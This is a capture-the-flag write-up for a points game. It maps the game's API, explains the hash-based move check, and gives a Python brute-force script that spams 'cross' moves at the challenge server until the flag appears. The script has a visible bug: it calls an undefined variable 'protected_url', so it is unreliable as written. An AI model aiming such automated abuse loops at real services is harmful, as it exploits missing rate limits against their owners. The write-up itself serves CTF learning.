### **Challenge Overview**

The challenge presents a simple game where the goal is to reach a score of **777 points** to retrieve the flag from the `/api/me` endpoint. The game involves making "moves" (either `cross` or `wait`) which increase the score by different amounts.

### **1. Enumeration & Analysis**

#### **Endpoint Mapping**

- `GET /api/me`: Returns user information (username, score, flag if score ≥777).
    
- `POST /api/play`: Accepts an action (`cross` or `wait`). `cross` adds **69 points**, and `wait` adds **1 point**.
    
- `GET /api/adminPlay`: A special endpoint that "always crosses."
    
- `POST /api/hint`: Takes a URL and makes an admin bot visit it using a headless Chromium browser.
    
- `GET /api/login` / `POST /api/register`: Standard authentication.
    

#### **The Core Logic (`getCorrectMove`)**

The server uses a function to determine the "safe" move for each turn:

1. It creates a SHA-256 hash using: `${userId}:${numberOfPlays}:${GAME_SEED}`.
    
2. It checks the last character of the hash.
    
3. If the character (converted to an integer) is **even**, the correct move is `cross`.
    
4. If it is **odd**, the correct move is `wait`.
    

If a user sends a move that does **not** match the `getCorrectMove` result, the score is reset to 0.

### **2. Vulnerability Assessment**

While the intended path likely involved an **XS-Leak** via the `/api/hint` and `/api/adminPlay` endpoints, a logic flaw was discovered in the `POST /api/play` implementation:

- **No Rate Limiting:** There is no limit on how many times a user can attempt a move.
    
- **Soft Reset:** A wrong move only resets the score; it does not lock the account or change the `GAME_SEED`.
    
- **Statistical Probability:** Since there are only two possible moves, there is a **50% chance** that `cross` is the correct move for any given `numberOfPlays`.
    

### **3. Exploitation (Brute-Force Strategy) (unintended path)** 

Because a correct `cross` yields 69 points and a failure only resets the progress, we can repeatedly send `cross` requests. Eventually, the sequence of "correct" moves will align enough times to surpass 777 points without needing to know the `GAME_SEED`.

#### **Exploit Script**

The following Python script automates the registration, login, and the brute-force process:


```python
import requests

# Create a session object
session = requests.Session()

credentials = {'username': 'skaw', 'password': 'password'}
cross = {'action':'cross'}

# register the account
register_url = 'http://46.225.117.62:30007/api/register'
session.post(register_url, data=credentials)

# login to start the session
login_url = 'http://46.225.117.62:30007/api/login'
session.post(login_url, data=credentials)

while True:
    # score value
    url = 'http://46.225.117.62:30007/api/me'
    response = session.get(protected_url)
    
    # Simple parsing logic from your original code
    score = response.text.split(",")[1].split(",")[0].split(":")[1]

    if int(score) < 777:
        # sending cross request
        play_url = "http://46.225.117.62:30007/api/play"
        session.post(play_url, data=cross)
    else:
        print(response.text)
        break
```
### **4. Conclusion & Flag**

After running the script for a short duration, the "cross" actions eventually synced with the server's deterministic hash sequence, pushing the score to **828**.

and alhamd llah we got the flag
**Flag:** `upCTF{xsL34ks_4r3_pr33ty-x8TUJa0c3cf0d6c7}`
